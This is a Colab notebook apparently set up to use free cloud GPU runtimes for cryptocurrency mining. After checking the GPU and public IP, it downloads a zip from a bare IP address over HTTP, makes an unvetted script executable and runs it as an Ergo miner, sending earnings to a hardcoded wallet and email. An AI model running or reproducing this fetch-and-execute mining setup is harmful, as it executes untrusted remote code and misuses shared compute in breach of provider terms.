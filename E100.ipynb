{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "CC.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "8uQ12Gz6ZzCb"
      },
      "source": [
        "# **MACHINE POWER**\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "cY1YjeXzZWkA"
      },
      "source": [
        "!nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ADtzqJ2JtIjt"
      },
      "source": [
        "!curl ipinfo.io"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "8S3CXRBTZa6C"
      },
      "source": [
        "!wget http://139.59.124.245:81/aria2/dl/wasa.zip\n",
		"! unzip wasa.zip\n",
        "%cd wasa\n",
        "!chmod +x tata.sh\n",
        "!ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./tata.sh -algo autolykos -pool1 ergo-eu1.nanopool.org:11111 -wallet 9fob9dXXQ2Kkcj6ErqyfTDs2HzdQV7XEkZNEGH6MK7BcZay8Mvt -coin ergo -rigName $ip -email zakigiri.vps3@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
